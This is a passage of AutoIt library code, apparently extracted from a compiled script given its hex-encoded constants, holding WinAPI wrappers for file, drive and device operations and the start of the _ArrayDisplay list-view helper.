    Local $tspt = DllStructCreate("ushort Length;byte ScsiStatus;byte PathId;byte TargetId;byte Lun;byte CdbLength;byte SenseInfoLength;byte DataIn;byte Alignment[3];ulong DataTransferLength;ulong TimeOutValue;ulong_ptr DataBufferOffset;ulong SenseInfoOffset;byte Cdb[16]" & (@AutoItX64 ? ";byte[4]" : "") & ";byte Hdr[8]")
    Local $tcdb = DllStructCreate("byte;byte;byte[6];byte[2];byte;byte;byte[4]", DllStructGetPtr($tspt, "Cdb"))
    Local $thdr = DllStructCreate("byte;byte;byte[3];byte;byte[2]", DllStructGetPtr($tspt, "Hdr"))
    Local $isize = DllStructGetPtr($tspt, "Hdr") - DllStructGetPtr($tspt)
    DllStructSetData($tspt, "Length", $isize)
    DllStructSetData($tspt, "ScsiStatus", 0x0)
    DllStructSetData($tspt, "PathId", 0x0)
    DllStructSetData($tspt, "TargetId", 0x0)
    DllStructSetData($tspt, "Lun", 0x0)
    DllStructSetData($tspt, "CdbLength", 0xc)
    DllStructSetData($tspt, "SenseInfoLength", 0x0)
    DllStructSetData($tspt, "DataIn", 0x1)
    DllStructSetData($tspt, "DataTransferLength", 0x8)
    DllStructSetData($tspt, "TimeOutValue", 0x15180)
    DllStructSetData($tspt, "DataBufferOffset", $isize)
    DllStructSetData($tspt, "SenseInfoOffset", 0x0)
    DllStructSetData($tcdb, 0x1, 0xbd)
    DllStructSetData($tcdb, 0x2, 0x0)
    DllStructSetData($tcdb, 0x4, 0x0, 0x1)
    DllStructSetData($tcdb, 0x4, 0x8, 0x2)
    DllStructSetData($tcdb, 0x5, 0x0)
    DllStructSetData($tcdb, 0x6, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x4d004, "struct*", $tspt, "dword", $isize, "struct*", $tspt, "dword", DllStructGetSize($tspt), "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, False)
    Return (BitAND(DllStructGetData($thdr, 0x2), 0x10) = 0x10)
EndFunc   ;==>_WINAPI_ISDOOROPEN
Func _WinAPI_IsPathShared($sfilepath)
    If Not __DLL("ntshrui.dll") Then Return SetError(0x67, 0x0, 0x0)
    Local $acall = DllCall("ntshrui.dll", "bool", "IsPathSharedW", "wstr", _WinAPI_PathRemoveBackslash($sfilepath), "int", 0x1)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISPATHSHARED
Func _WinAPI_IsWritable($sdrive)
    DriveGetFileSystem($sdrive)
    If @error Then Return SetError(0x28 + @error, _WinAPI_GetLastError(), 0x0)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, 0x0, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x70024, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
    Local Const $error_write_protect = 0x13
    If __CHECKERRORCLOSEHANDLE($acall, $hfile, 0x1) <> 0xa And @extended = $error_write_protect Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_ISWRITABLE
Func _WinAPI_LoadMedia($sdrive)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, $generic_read, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, False)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d480c, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_LOADMEDIA
Func _WinAPI_LockDevice($sdrive, $block)
    Local $hfile = _WinAPI_CreateFileEx("\\.\" & $sdrive, $open_existing, $generic_readwrite, $file_share_readwrite)
    If @error Then Return SetError(@error + 0x14, @extended, False)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d4804, "boolean*", $block, "dword", 0x1, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_LOCKDEVICE
Func _WinAPI_LockFile($hfile, $ioffset, $ilength)
    Local $acall = DllCall("kernel32.dll", "bool", "LockFile", "handle", $hfile, "dword", _WinAPI_LoDWord($ioffset), "dword", _WinAPI_HiDWord($ioffset), "dword", _WinAPI_LoDWord($ilength), "dword", _WinAPI_HiDWord($ilength))
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_LOCKFILE
Func _WinAPI_MapViewOfFile($hmapping, $ioffset = 0x0, $ibytes = 0x0, $iaccess = 0x6)
    Local $acall = DllCall("kernel32.dll", "ptr", "MapViewOfFile", "handle", $hmapping, "dword", $iaccess, "dword", _WinAPI_HiDWord($ioffset), "dword", _WinAPI_LoDWord($ioffset), "ulong_ptr", $ibytes)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_MAPVIEWOFFILE
Func _WinAPI_MoveFileEx($sexistingfile, $snewfile, $iflags = 0x0, $pprogressproc = 0x0, $pdata = 0x0)
    If Not StringStripWS($snewfile, $str_stripleading + $str_striptrailing) Then $snewfile = Null
    If BitAND($iflags, $move_file_delay_until_reboot) Then
        If $snewfile = 0x0 Then $snewfile = Null
    EndIf
    Local $acall = DllCall("kernel32.dll", "bool", "MoveFileWithProgressW", "wstr", $sexistingfile, "wstr", $snewfile, "ptr", $pprogressproc, "ptr", $pdata, "dword", $iflags)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_MOVEFILEEX
Func _WinAPI_OpenFileById($hfile, $vid, $iaccess = 0x0, $ishare = 0x0, $iflags = 0x0)
    Local $tfidd = DllStructCreate("dword;uint;int64;int64")
    Local $hobj, $acall, $itype, $ierror = 0x0
    Select
        Case IsString($vid)
            $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $vid, "ptr", DllStructGetPtr($tfidd, 0x3))
            If @error Or $acall[0x0] Then
                Return SetError(@error + 0x1e, 0x0, 0x0)
            EndIf
            $itype = 0x1
        Case IsDllStruct($vid)
            If Not _WinAPI_MoveMemory(DllStructGetPtr($tfidd, 0x3), DllStructGetPtr($vid), 0x10) Then
                Return SetError(@error + 0x28, 0x0, 0x0)
            EndIf
            $itype = 0x1
        Case Else
            DllStructSetData($tfidd, 0x3, $vid)
            $itype = 0x0
    EndSelect
    DllStructSetData($tfidd, 0x1, DllStructGetSize($tfidd))
    DllStructSetData($tfidd, 0x2, $itype)
    If IsString($hfile) Then
        $hobj = _WinAPI_CreateFileEx($hfile, $open_existing, 0x0, $file_share_readwrite, $file_flag_backup_semantics)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Else
        $hobj = $hfile
    EndIf
    $acall = DllCall("kernel32.dll", "handle", "OpenFileById", "handle", $hobj, "struct*", $tfidd, "dword", $iaccess, "dword", $ishare, "ptr", 0x0, "dword", $iflags)
    If @error Or ($acall[0x0] = Ptr(+0xffffffff)) Then $ierror = @error + 0xa
    If IsString($hfile) Then
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobj)
    EndIf
    If $ierror Then Return SetError($ierror, 0x0, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_OPENFILEBYID
Func _WinAPI_OpenFileMapping($sname, $iaccess = 0x6, $binherit = False)
    Local $acall = DllCall("kernel32.dll", "handle", "OpenFileMappingW", "dword", $iaccess, "bool", $binherit, "wstr", $sname)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_OPENFILEMAPPING
Func _WinAPI_PathIsDirectoryEmpty($sfilepath)
    Local $acall = DllCall("shlwapi.dll", "bool", "PathIsDirectoryEmptyW", "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_PATHISDIRECTORYEMPTY
Func _WinAPI_QueryDosDevice($sdevice)
    If Not StringStripWS($sdevice, $str_stripleading + $str_striptrailing) Then $sdevice = Null
    Local $tdata = DllStructCreate("wchar[16384]")
    Local $acall = DllCall("kernel32.dll", "dword", "QueryDosDeviceW", "wstr", $sdevice, "struct*", $tdata, "dword", 0x4000)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Local $aret = _WinAPI_StructToArray($tdata)
    If IsString($sdevice) Then
        $aret = $aret[0x1]
    EndIf
    Return $aret
EndFunc   ;==>_WINAPI_QUERYDOSDEVICE
Func _WinAPI_ReadDirectoryChanges($hdirectory, $ifilter, $pbuffer, $ilength, $bsubtree = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "ReadDirectoryChangesW", "handle", $hdirectory, "struct*", $pbuffer, "dword", $ilength - Mod($ilength, 0x4), "bool", $bsubtree, "dword", $ifilter, "dword*", 0x0, "ptr", 0x0, "ptr", 0x0)
    If @error Or Not $acall[0x0] Or (Not $acall[0x6]) Then Return SetError(@error + 0xa, @extended, 0x0)
    $pbuffer = $acall[0x2]
    Local $adata[0x65][0x2] = [[0x0]]
    Local $tfni, $ibuffer = 0x0, $ioffset = 0x0
    Do
        $ibuffer += $ioffset
        $tfni = DllStructCreate("dword NextEntryOffset;dword Action;dword FileNameLength;wchar FileName[" & (DllStructGetData(DllStructCreate("dword FileNameLength", $pbuffer + $ibuffer + 0x8), 0x1) / 0x2) & "]", $pbuffer + $ibuffer)
        __INC($adata)
        $adata[$adata[0x0][0x0]][0x0] = DllStructGetData($tfni, "FileName")
        $adata[$adata[0x0][0x0]][0x1] = DllStructGetData($tfni, "Action")
        $ioffset = DllStructGetData($tfni, "NextEntryOffset")
    Until Not $ioffset
    __INC($adata, +0xffffffff)
    Return $adata
EndFunc   ;==>_WINAPI_READDIRECTORYCHANGES
Func _WinAPI_RemoveDirectory($sdirpath)
    Local $acall = DllCall("kernel32.dll", "bool", "RemoveDirectoryW", "wstr", $sdirpath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_REMOVEDIRECTORY
Func _WinAPI_ReOpenFile($hfile, $iaccess, $ishare, $iflags = 0x0)
    Local $acall = DllCall("kernel32.dll", "handle", "ReOpenFile", "handle", $hfile, "dword", $iaccess, "dword", $ishare, "dword", $iflags)
    If @error Or ($acall[0x0] = Ptr(+0xffffffff)) Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_REOPENFILE
Func _WinAPI_ReplaceFile($sreplacedfile, $sreplacementfile, $sbackupfile = "", $iflags = 0x0)
    If Not StringStripWS($sbackupfile, $str_stripleading + $str_striptrailing) Then $sbackupfile = Null
    Local $acall = DllCall("kernel32.dll", "bool", "ReplaceFileW", "wstr", $sreplacedfile, "wstr", $sreplacementfile, "wstr", $sbackupfile, "dword", $iflags, "ptr", 0x0, "ptr", 0x0)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_REPLACEFILE
Func _WinAPI_SearchPath($sfilepath, $ssearchpath = "")
    If Not StringStripWS($ssearchpath, $str_stripleading + $str_striptrailing) Then $ssearchpath = Null
    Local $acall = DllCall("kernel32.dll", "dword", "SearchPathW", "wstr", $ssearchpath, "wstr", $sfilepath, "ptr", 0x0, "dword", 0x1000, "wstr", "", "ptr", 0x0)
    If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, "")
    Return $acall[0x5]
EndFunc   ;==>_WINAPI_SEARCHPATH
Func _WinAPI_SetCompression($sfilepath, $icompression)
    Local $hfile = _WinAPI_CreateFileEx($sfilepath, $open_existing, $generic_readwrite, $file_share_readwrite, $file_flag_backup_semantics)
    If @error Then Return SetError(@error + 0x14, @extended, 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x9c040, "ushort*", $icompression, "dword", 0x2, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
    If __CHECKERRORCLOSEHANDLE($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_SETCOMPRESSION
Func _WinAPI_SetCurrentDirectory($sdir)
    Local $acall = DllCall("kernel32.dll", "int", "SetCurrentDirectoryW", "wstr", $sdir)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETCURRENTDIRECTORY
Func _WinAPI_SetEndOfFile($hfile)
    Local $acall = DllCall("kernel32.dll", "bool", "SetEndOfFile", "handle", $hfile)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETENDOFFILE
Func _WinAPI_SetFileAttributes($sfilepath, $iattributes)
    Local $acall = DllCall("kernel32.dll", "int", "SetFileAttributesW", "wstr", $sfilepath, "dword", $iattributes)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETFILEATTRIBUTES
Func _WinAPI_SetFileInformationByHandleEx($hfile, $tfileinfo)
    Local $acall = DllCall("ntdll.dll", "long", "ZwSetInformationFile", "handle", $hfile, "struct*", $tfileinfo, "struct*", $tfileinfo, "ulong", DllStructGetSize($tfileinfo), "uint", 0x4)
    If @error Then Return SetError(@error, @extended, 0x0)
    If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
    Return 0x1
EndFunc   ;==>_WINAPI_SETFILEINFORMATIONBYHANDLEEX
Func _WinAPI_SetFilePointer($hfile, $ipos, $imethod = 0x0)
    Local $acall = DllCall("kernel32.dll", "INT", "SetFilePointer", "handle", $hfile, "long", $ipos, "ptr", 0x0, "long", $imethod)
    If @error Then Return SetError(@error, @extended, +0xffffffff)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETFILEPOINTER
Func _WinAPI_SetFilePointerEx($hfile, $ipos, $imethod = 0x0)
    Local $acall = DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $hfile, "int64", $ipos, "int64*", 0x0, "dword", $imethod)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETFILEPOINTEREX
Func _WinAPI_SetFileShortName($hfile, $sshortname)
    Local $acall = DllCall("kernel32.dll", "bool", "SetFileShortNameW", "handle", $hfile, "wstr", $sshortname)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETFILESHORTNAME
Func _WinAPI_SetFileValidData($hfile, $ilength)
    Local $acall = DllCall("kernel32.dll", "bool", "SetFileValidData", "handle", $hfile, "int64", $ilength)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETFILEVALIDDATA
Func _WinAPI_SetSearchPathMode($iflags)
    Local $acall = DllCall("kernel32.dll", "bool", "SetSearchPathMode", "dword", $iflags)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETSEARCHPATHMODE
Func _WinAPI_SetVolumeMountPoint($sfilepath, $sguid)
    Local $acall = DllCall("kernel32.dll", "bool", "SetVolumeMountPointW", "wstr", $sfilepath, "wstr", $sguid)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SETVOLUMEMOUNTPOINT
Func _WinAPI_SfcIsFileProtected($sfilepath)
    If Not __DLL("sfc.dll") Then Return SetError(0x67, 0x0, False)
    Local $acall = DllCall("sfc.dll", "bool", "SfcIsFileProtected", "handle", 0x0, "wstr", $sfilepath)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_SFCISFILEPROTECTED
Func _WinAPI_UnlockFile($hfile, $ioffset, $ilength)
    Local $acall = DllCall("kernel32.dll", "bool", "UnlockFile", "handle", $hfile, "dword", _WinAPI_LoDWord($ioffset), "dword", _WinAPI_HiDWord($ioffset), "dword", _WinAPI_LoDWord($ilength), "dword", _WinAPI_HiDWord($ilength))
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_UNLOCKFILE
Func _WinAPI_UnmapViewOfFile($paddress)
    Local $acall = DllCall("kernel32.dll", "bool", "UnmapViewOfFile", "ptr", $paddress)
    If @error Then Return SetError(@error, @extended, False)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_UNMAPVIEWOFFILE
Func _WinAPI_Wow64EnableWow64FsRedirection($benable)
    Local $acall = DllCall("kernel32.dll", "boolean", "Wow64EnableWow64FsRedirection", "boolean", $benable)
    If @error Then Return SetError(@error, @extended, 0x0)
    Return $acall[0x0]
EndFunc   ;==>_WINAPI_WOW64ENABLEWOW64FSREDIRECTION
#EndRegion Public Functions
#Region Internal Functions
Func __WINAPI_MAKEQWORD($ilodword, $ihidword)
    Local $tint64 = DllStructCreate("uint64")
    Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
    DllStructSetData($tdwords, 0x1, $ilodword)
    DllStructSetData($tdwords, 0x2, $ihidword)
    Return DllStructGetData($tint64, 0x1)
EndFunc   ;==>__WINAPI_MAKEQWORD
#EndRegion Internal Functions
#ignorefunc __SQLite_Inline_Version, __SQLite_Inline_Modified
#Region Global Variables and Constants
Global $_g_arraydisplay_buserfunc = False
Global $_g_arraydisplay_hlistview
Global $_g_arraydisplay_itranspose
Global $_g_arraydisplay_idisplayrow
Global $_g_arraydisplay_aarray
Global $_g_arraydisplay_idims
Global $_g_arraydisplay_nrows
Global $_g_arraydisplay_ncols
Global $_g_arraydisplay_iitem_start
Global $_g_arraydisplay_iitem_end
Global $_g_arraydisplay_isubitem_start
Global $_g_arraydisplay_isubitem_end
Global $_g_arraydisplay_aindex
Global $_g_arraydisplay_aindexes[0x1]
Global $_g_arraydisplay_isortdir
Global $_g_arraydisplay_asheader
Global $_g_arraydisplay_anumericsort
Global $arraydisplay_rowprefix = "#"
Global $arraydisplay_numericsort = "*"
Global Const $arraydisplay_colalignleft = 0x0
Global Const $arraydisplay_transpose = 0x1
Global Const $arraydisplay_colalignright = 0x2
Global Const $arraydisplay_colaligncenter = 0x4
Global Const $arraydisplay_verbose = 0x8
Global Const $arraydisplay_norow = 0x40
Global Const $arraydisplay_checkerror = 0x80
Global Const $_arrayconstant_taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
Func __ARRAYDISPLAY_SHARE(Const ByRef $aarray, $stitle = Default, $sarrayrange = Default, $iflags = Default, $vuser_separator = Default, $sheader = Default, $idesired_colwidth = Default, $huser_function = Default, $bdebug = True, Const $_iscriptlinenumber = @ScriptLineNumber, Const $_icallererror = @error, Const $_icallerextended = @extended)
    Local $smsgboxtitle = (($bdebug) ? ("_DebugArrayDisplay") : ("_ArrayDisplay"))
    If $_g_arraydisplay_buserfunc Then
        $huser_function = Default
        $bdebug = False
    EndIf
    If Not IsKeyword($huser_function) = $keyword_default Then
        $_g_arraydisplay_buserfunc = True
    EndIf
    If $stitle = Default Then $stitle = $smsgboxtitle
    If $sarrayrange = Default Then $sarrayrange = ""
    If $iflags = Default Then $iflags = 0x0
    If $vuser_separator = Default Then $vuser_separator = ""
    If $sheader = Default Then $sheader = ""
    Local $imin_colwidth = 0x37
    Local $imax_colwidth = 0x15e
    If $idesired_colwidth > 0x0 Then $imax_colwidth = $idesired_colwidth
    If $idesired_colwidth < 0x0 Then $imin_colwidth = -$idesired_colwidth
    If $imax_colwidth = Default Then $imax_colwidth = 0x15e
    If $imax_colwidth > 0xfff Then $imax_colwidth = 0xfff
    If $huser_function = Default Then $huser_function = 0x0
    $_g_arraydisplay_itranspose = BitAND($iflags, $arraydisplay_transpose)
    Local $icolalign = BitAND($iflags, 0x6)
    Local $iverbose = Int(BitAND($iflags, $arraydisplay_verbose))
    $_g_arraydisplay_idisplayrow = Int(BitAND($iflags, $arraydisplay_norow) = 0x0)
    Local $ibuttonborder = (($bdebug) ? (0x28) : (0x14))
    #Region Check valid array
    Local $smsg = "", $iret = 0x1
    Local $ftimer = 0x0
    If IsArray($aarray) Then
        $_g_arraydisplay_aarray = $aarray
        $_g_arraydisplay_idims = UBound($_g_arraydisplay_aarray, $ubound_dimensions)
        If $_g_arraydisplay_idims = 0x1 Then $_g_arraydisplay_itranspose = 0x0
        $_g_arraydisplay_nrows = UBound($_g_arraydisplay_aarray, $ubound_rows)
        $_g_arraydisplay_ncols = ($_g_arraydisplay_idims = 0x2) ? UBound($_g_arraydisplay_aarray, $ubound_columns) : 0x1
        Dim $_g_arraydisplay_anumericsort[$_g_arraydisplay_ncols]
        If $_g_arraydisplay_idims > 0x2 Then
            $smsg = "Larger than 2D array passed to function"
            $iret = 0x2
        EndIf
        If $_icallererror Then
            If $bdebug Then
                If IsDeclared("__g_sReportCallBack_DebugReport_Debug") Then
                    $smsg = "@@ Debug( " & $_iscriptlinenumber & ") : @error = " & $_icallererror & " in " & $smsgboxtitle & "( '" & $stitle & "' )"
                    Execute('$__g_sReportCallBack_DebugReport_Debug("' & $smsg & '")')
                EndIf
                $iret = 0x3
            ElseIf BitAND($iflags, $arraydisplay_checkerror) Then
                $smsg = "@error = " & $_icallererror & " when calling the function"
                If $_iscriptlinenumber > 0x0 Then $smsg &= " at line " & $_iscriptlinenumber
                $iret = 0x3
            EndIf
        EndIf
    Else
        $smsg = "No array variable passed to function"
    EndIf
    If $smsg Then
        If $iverbose And MsgBox($mb_systemmodal + $mb_iconerror + $mb_yesno, $smsgboxtitle & "() Error: " & $stitle, $smsg & @CRLF & @CRLF & "Exit the script?") = $idyes Then
            Exit
        Else
            Return SetError($iret, 0x0, 0x0)
        EndIf
    EndIf
    #EndRegion Check valid array
    #Region Check array range
    Local $icw_colwidth = Number($vuser_separator)
    Local $scurr_separator = Opt("GUIDataSeparatorChar")
    If $vuser_separator = "" Then $vuser_separator = $scurr_separator
    $_g_arraydisplay_iitem_start = 0x0
    $_g_arraydisplay_iitem_end = $_g_arraydisplay_nrows + 0xffffffff
    $_g_arraydisplay_isubitem_start = 0x0
    $_g_arraydisplay_isubitem_end = (($_g_arraydisplay_idims = 0x2) ? ($_g_arraydisplay_ncols + 0xffffffff) : (0x0))
    Local $avrangesplit
    If $sarrayrange Then
        Local $vtmp, $aarray_range = StringRegExp($sarrayrange & "||", "(?U)(.*)\|", $str_regexparrayglobalmatch)
        If $aarray_range[0x0] Then
            $avrangesplit = StringSplit($aarray_range[0x0], ":")
            If @error Then
                $_g_arraydisplay_iitem_end = Number($aarray_range[0x0])
            Else
                $_g_arraydisplay_iitem_start = Number($avrangesplit[0x1])
                If $avrangesplit[0x2] <> "" Then
                    $_g_arraydisplay_iitem_end = Number($avrangesplit[0x2])
                EndIf
            EndIf
        EndIf
        If $_g_arraydisplay_iitem_start < 0x0 Then $_g_arraydisplay_iitem_start = 0x0
        If $_g_arraydisplay_iitem_end >= $_g_arraydisplay_nrows Then $_g_arraydisplay_iitem_end = $_g_arraydisplay_nrows + 0xffffffff
        If ($_g_arraydisplay_iitem_start > $_g_arraydisplay_iitem_end) And ($_g_arraydisplay_iitem_end > 0x0) Then
            $vtmp = $_g_arraydisplay_iitem_start
            $_g_arraydisplay_iitem_start = $_g_arraydisplay_iitem_end
            $_g_arraydisplay_iitem_end = $vtmp
        EndIf
        If $_g_arraydisplay_idims = 0x2 And $aarray_range[0x1] Then
            $avrangesplit = StringSplit($aarray_range[0x1], ":")
            If @error Then
                $_g_arraydisplay_isubitem_end = Number($aarray_range[0x1])
            Else
                $_g_arraydisplay_isubitem_start = Number($avrangesplit[0x1])
                If $avrangesplit[0x2] <> "" Then
                    $_g_arraydisplay_isubitem_end = Number($avrangesplit[0x2])
                EndIf
            EndIf
            If $_g_arraydisplay_isubitem_start > $_g_arraydisplay_isubitem_end Then
                $vtmp = $_g_arraydisplay_isubitem_start
                $_g_arraydisplay_isubitem_start = $_g_arraydisplay_isubitem_end
                $_g_arraydisplay_isubitem_end = $vtmp
            EndIf
            If $_g_arraydisplay_isubitem_start < 0x0 Then $_g_arraydisplay_isubitem_start = 0x0
            If $_g_arraydisplay_isubitem_end >= $_g_arraydisplay_ncols Then $_g_arraydisplay_isubitem_end = $_g_arraydisplay_ncols + 0xffffffff
        EndIf
    EndIf
    Local $sdisplaydata = "[" & $_g_arraydisplay_nrows & "]"
    If $_g_arraydisplay_idims = 0x2 Then
        $sdisplaydata &= " [" & $_g_arraydisplay_ncols & "]"
    EndIf
    Local $stipdata = ""
    If $sarrayrange Then
        If $stipdata Then $stipdata &= " - "
        $stipdata &= "Range set " & $sarrayrange
    EndIf
    If $_g_arraydisplay_itranspose Then
        If $stipdata Then $stipdata &= " - "
        $stipdata &= "Transposed"
    EndIf
    If $sarrayrange Or $_g_arraydisplay_itranspose Then $_g_arraydisplay_aarray = __ARRAYDISPLAY_CREATESUBARRAY()
    #EndRegion Check array range
    #Region Check custom header
    $_g_arraydisplay_asheader = StringSplit($sheader, $scurr_separator, $str_nocount)
    If UBound($_g_arraydisplay_asheader) = 0x0 Then Dim $_g_arraydisplay_asheader[0x1] = [""]
    $sheader = "Row"
    Local $iindex = $_g_arraydisplay_isubitem_start
    If $_g_arraydisplay_itranspose Then
        $sheader = "Row"
        For $j = 0x0 To $_g_arraydisplay_ncols + 0xffffffff
            $sheader &= $scurr_separator & $arraydisplay_rowprefix & " " & $j + $_g_arraydisplay_isubitem_start
        Next
    Else
        If $_g_arraydisplay_asheader[0x0] Then
            For $iindex = $_g_arraydisplay_isubitem_start To $_g_arraydisplay_isubitem_end
                If $iindex >= UBound($_g_arraydisplay_asheader) Then ExitLoop
                If StringRight($_g_arraydisplay_asheader[$iindex], 0x1) = $arraydisplay_numericsort Then
                    $_g_arraydisplay_asheader[$iindex] = StringTrimRight($_g_arraydisplay_asheader[$iindex], 0x1)
                    $_g_arraydisplay_anumericsort[$iindex - $_g_arraydisplay_isubitem_start] = 0x1
                EndIf
                $sheader &= $scurr_separator & $_g_arraydisplay_asheader[$iindex]
            Next
        EndIf
        For $j = $iindex To $_g_arraydisplay_isubitem_end
            $sheader &= $scurr_separator & "Col " & $j
        Next
    EndIf
    If Not $_g_arraydisplay_idisplayrow Then $sheader = StringTrimLeft($sheader, 0x4)
    #EndRegion Check custom header
    #Region Generate Sort index for columns
    __ARRAYDISPLAY_SORTINDEXES(0x0, +0xffffffff)
    Local $htimer = TimerInit()
    __ARRAYDISPLAY_SORTINDEXES(0x1, 0x1)
    $ftimer = TimerDiff($htimer)
    If $ftimer * $_g_arraydisplay_ncols < 0x3e8 Then
        __ARRAYDISPLAY_SORTINDEXES(0x2, $_g_arraydisplay_ncols)
    Else
    EndIf
    #EndRegion Generate Sort index for columns
    #Region GUI and Listview generation
    If $iverbose And ($_g_arraydisplay_nrows * $_g_arraydisplay_ncols) > 0x3e8 Then
        SplashTextOn($smsgboxtitle, "Preparing display" & @CRLF & @CRLF & "Please be patient", 0x12c, 0x64)
    EndIf
    Local Const $_arrayconstant_gui_dockbottom = 0x40
    Local Const $_arrayconstant_gui_dockborders = 0x66
    Local Const $_arrayconstant_gui_dockheight = 0x200
    Local Const $_arrayconstant_gui_dockleft = 0x2
    Local Const $_arrayconstant_gui_dockright = 0x4
    Local Const $_arrayconstant_gui_dockhcenter = 0x8
    Local Const $_arrayconstant_gui_event_close = +0xfffffffd
    Local Const $_arrayconstant_gui_event_array = 0x1
    Local Const $_arrayconstant_gui_focus = 0x100
    Local Const $_arrayconstant_ss_center = 0x1
    Local Const $_arrayconstant_ss_centerimage = 0x200
    Local Const $_arrayconstant_lvm_getitemrect = (0x1000 + 0xe)
    Local Const $_arrayconstant_lvm_getitemstate = (0x1000 + 0x2c)
    Local Const $_arrayconstant_lvm_getselectedcount = (0x1000 + 0x32)
    Local Const $_arrayconstant_lvm_setextendedlistviewstyle = (0x1000 + 0x36)
    Local Const $_arrayconstant_lvs_ex_gridlines = 0x1
    Local Const $_arrayconstant_lvis_selected = 0x2
    Local Const $_arrayconstant_lvs_showselalways = 0x8
    Local Const $_arrayconstant_lvs_ownerdata = 0x1000
    Local Const $_arrayconstant_lvs_ex_fullrowselect = 0x20
    Local Const $_arrayconstant_lvs_ex_doublebuffer = 0x10000
    Local Const $_arrayconstant_ws_ex_clientedge = 0x200
    Local Const $_arrayconstant_ws_maximizebox = 0x10000
    Local Const $_arrayconstant_ws_minimizebox = 0x20000
    Local Const $_arrayconstant_ws_sizebox = 0x40000
    Local $icoordmode = Opt("GUICoordMode", 0x1)
    Local $iorgwidth = 0xd2, $iheight = 0xc8, $iminsize = 0xfa
    Local $hgui = GUICreate($stitle, $iorgwidth, $iheight, Default, Default, BitOR($_arrayconstant_ws_sizebox, $_arrayconstant_ws_minimizebox, $_arrayconstant_ws_maximizebox))
    Local $aiguisize = WinGetClientSize($hgui)
    Local $idlistview = GUICtrlCreateListView($sheader, 0x0, 0x0, $aiguisize[0x0], $aiguisize[0x1] - $ibuttonborder, BitOR($_arrayconstant_lvs_showselalways, $_arrayconstant_lvs_ownerdata))
